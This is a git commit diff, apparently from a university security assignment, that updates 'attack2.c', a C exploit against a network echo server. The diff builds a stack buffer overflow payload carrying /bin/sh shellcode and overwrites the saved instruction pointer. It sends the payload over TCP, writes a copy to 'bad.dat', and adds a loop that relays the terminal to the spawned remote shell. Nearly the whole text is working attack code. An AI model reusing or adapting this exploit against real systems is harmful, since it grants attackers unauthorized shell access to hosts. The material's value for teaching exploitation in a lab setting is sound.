61a33e1e2da165f76d7120721e3a610422d31b67
Stuart Olsen <so1132@txstate.edu>
2015-03-03 19:19:18 -0600

    Exploit works

--- attack2.c
+++ attack2.c
@@ -86,9 +86,21 @@ status_t connect_tcp (int (*the_socket),
 
 #include <stdint.h>
 #include <limits.h>
+#include <stdbool.h>
+#include <stdio.h>
+
+bool has_zero (uint64_t n)
+{
+	for (int i = 0; i < sizeof (n); ++i)
+		if (((char*)&n) [i] == 0)
+			return true;
+	return false;
+}
 
 status_t prepare_exploit (char* (*data),
-                          uint64_t buf_addr,
+                          size_t (*size),
+                          uint64_t main_buf_addr,
+                          uint64_t foo_buf_addr,
                           uint64_t rip_addr)
 {
 	static const char shellcode [] =
@@ -98,7 +110,7 @@ status_t prepare_exploit (char* (*data),
 		"\x0f\x05\xe8\xe3\xff\xff\xff\x2f"
 		"\x62\x69\x6e\x2f\x73\x68";
 
-	size_t rip_offset = rip_addr - buf_addr;
+	size_t rip_offset = rip_addr - foo_buf_addr;
 	size_t data_size  = rip_offset          // Distance to RIP
                       + sizeof (uint64_t)   // Size of RIP
                       + 128                 // 128 bytes of padding
@@ -114,61 +126,64 @@ status_t prepare_exploit (char* (*data),
 	_data [data_size] = '\0';
 
 	// Set the RIP to the highest address before the shell code
-	uint64_t new_rip = buf_addr + data_size - strlen (shellcode);
+	uint64_t new_rip = main_buf_addr + data_size - strlen (shellcode);
 	memcpy (_data + rip_offset, &new_rip, sizeof (uint64_t));
 
 	// Copy in the shell code
 	memcpy (_data + data_size - strlen (shellcode), shellcode, strlen (shellcode));
 
 	(*data) = _data;
+	(*size) = data_size;
 	return success ();
 }
 
 
 #include <stdio.h>
 #include <unistd.h>
+#include <fcntl.h>
 
-status_t stream_exploit (const char* data, FILE* stream)
+status_t send_exploit (const char* data, size_t size, int fd)
 {
-	if (fputs (data, stream) <= 0)
-		return efailure (errno);
-	return success ();
-}
-
-status_t dump_exploit (const char* data, const char* filename)
-{
-	FILE* file = fopen (filename, "w");
-	if (file == NULL)
-		return efailure (errno);
-
-	status_t status = stream_exploit (data, file);
-	if (failed (status))
-		return status;
-
-	if (fclose (file) != 0)
-		return efailure (errno);
+	size_t written = 0;
+	while (written < size) {
+		ssize_t l = write (fd, data + written, size - written);
+		if (l == -1)
+			return efailure (errno);
+		written += l;
+	}
 
 	return success ();
 }
 
-status_t send_exploit (const char* data, int fd)
+status_t dump_exploit (const char* data, size_t size, const char* filename)
 {
-	int fd2 = dup (fd);
-	if (fd2 == -1)
+	int fd = creat (filename, 0644);
+	if (fd == -1)
 		return efailure (errno);
 
-	FILE* stream = fdopen (fd2, "w");
-	if (stream == NULL)
-		return efailure (errno);
-
-	status_t status = stream_exploit (data, stream);
+	status_t status = send_exploit (data, size, fd);
 	if (failed (status))
 		return status;
 
-	if (fclose (stream) != 0)
+	if (close (fd) != 0)
 		return efailure (errno);
 
 	return success ();
+}
+
+
+
+void talktoserver (int clsck)
+{
+	for (;;) {
+		char buf [256];
+		int len = read (0, buf, 256);
+		send (clsck, buf, len, 0);
+		while ((len = recv (clsck, buf, 256, MSG_DONTWAIT)) > 0)
+			write (1, buf, len);
+		if (strncmp (buf, "exit\n", 5)==0)
+			return;
+	}
 }
 
 
@@ -177,7 +192,7 @@ status_t parse_address (uint64_t (*addr),
                         const char* addr_s)
 {
 	const char* endptr = addr_s;
-	uint64_t _addr = strtoull (addr_s, (char**)&endptr, 10);
+	uint64_t _addr = strtoull (addr_s, (char**)&endptr, 16);
 	if ((*addr_s == '\0' || *endptr != '\0'))
 		return failure ("Invalid address");
 
@@ -189,34 +204,42 @@ int main (int argc, char** argv)
 {
 	status_t status = success ();
 
-	if (argc != 5) {
-		fprintf (stderr, "Usage: %s address port buf_addr rip_addr\n", argc == 0 ? "attack" : argv [0]);
+	if (argc != 6) {
+		fprintf (stderr, "Usage: %s address port main_buf_addr foo_buf_addr rip_addr\n", argc == 0 ? "attack" : argv [0]);
 		return EXIT_FAILURE;
 	}
 
-	uint64_t buf_addr = 0;
-	status = parse_address (&buf_addr, argv [3]);
+	uint64_t main_buf_addr = 0;
+	status = parse_address (&main_buf_addr, argv [3]);
 	if (failed (status)) {
 		fprintf (stderr, "%s: %s\n", status.reason, argv [3]);
 		return EXIT_FAILURE;
 	}
 
-	uint64_t rip_addr = 0;
-	status = parse_address (&rip_addr, argv [4]);
+	uint64_t foo_buf_addr = 0;
+	status = parse_address (&foo_buf_addr, argv [4]);
 	if (failed (status)) {
 		fprintf (stderr, "%s: %s\n", status.reason, argv [4]);
 		return EXIT_FAILURE;
 	}
 
+	uint64_t rip_addr = 0;
+	status = parse_address (&rip_addr, argv [5]);
+	if (failed (status)) {
+		fprintf (stderr, "%s: %s\n", status.reason, argv [5]);
+		return EXIT_FAILURE;
+	}
+
 	char* exploit = NULL;
-	status = prepare_exploit (&exploit, buf_addr, rip_addr);
+	size_t exploit_size = 0;
+	status = prepare_exploit (&exploit, &exploit_size, main_buf_addr, foo_buf_addr, rip_addr);
 	if (failed (status)) {
 		fprintf (stderr, "Could not prepare exploit (%s)\n", status.reason);
 		return EXIT_FAILURE;
 	}
 
 	const char* filename = "bad.dat";
-	status = dump_exploit (exploit, filename);
+	status = dump_exploit (exploit, exploit_size, filename);
 	if (failed (status)) {
 		fprintf (stderr, "Could not dump exploit to %s (%s)\n", filename, status.reason);
 		return EXIT_FAILURE;
@@ -229,11 +252,13 @@ int main (int argc, char** argv)
 		return EXIT_FAILURE;
 	}
 
-	status = send_exploit (exploit, echo_socket);
+	status = send_exploit (exploit, exploit_size, echo_socket);
 	if (failed (status)) {
 		fprintf (stderr, "Could not send exploit to %s:%s (%s)\n", argv [1], argv [2], status.reason);
 		return EXIT_FAILURE;
 	}
+
+	talktoserver (echo_socket);
 
 	free (exploit);
 	close (echo_socket);
